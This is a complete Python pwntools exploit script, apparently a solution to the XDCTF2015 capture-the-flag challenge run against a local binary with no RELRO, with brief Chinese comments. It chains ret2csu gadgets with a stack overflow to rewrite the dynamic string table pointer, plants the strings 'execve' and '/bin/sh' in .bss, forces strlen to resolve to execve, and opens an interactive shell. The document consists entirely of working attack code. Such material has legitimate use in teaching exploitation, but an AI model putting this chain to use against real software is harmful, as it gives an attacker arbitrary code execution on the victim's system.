from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p	= process('./main_no_relro_64')
elf	= ELF('./main_no_relro_64')

dl			= 0x4004F6
csu_part1	= 0x400750
csu_part2	= 0x400766
STRTAB		= 0x600988 + 8
bss_addr	= elf.bss()
read_got	= elf.got['read']
strlen_got	= elf.got['strlen']
vuln_addr	= elf.symbols['vuln']

#	使用ret2csu来调用函数
def csu(fun, edi, rsi, rdx):
	payload = b''
	payload += p64(csu_part2)
	payload += p64(0)	# add rsp, 8
	payload += p64(0)	# pop rbx
	payload += p64(1)	# pop rbp
	payload += p64(fun)	# pop r12
	payload += p64(edi)	# pop r13
	payload += p64(rsi)	# pop r14
	payload += p64(rdx)	# pop r15
	payload += p64(csu_part1)
	payload += p64(0) * 7
	return payload

p.recvuntil('Welcome to XDCTF2015~!\n')

# 修改STRTAB的值指向bss段
p.send(b'a' * 120 + csu(read_got, 0, STRTAB, 8) + p64(vuln_addr))
p.send(p64(bss_addr - 0x11))

# 在bss段写入伪造的字符串
p.send(b'a' * 120 + csu(read_got, 0, bss_addr, 7 + 8) + p64(vuln_addr))
p.send(b'execve\x00/bin/sh\x00')

# 调用strlen的plt的第二部分去重定向strlen
p.send(b'a' * 120 + p64(dl) + p64(vuln_addr))

# 调用execve
p.send(b'a' * 120 + csu(strlen_got, bss_addr + 7, 0, 0) + p64(vuln_addr))

p.interactive()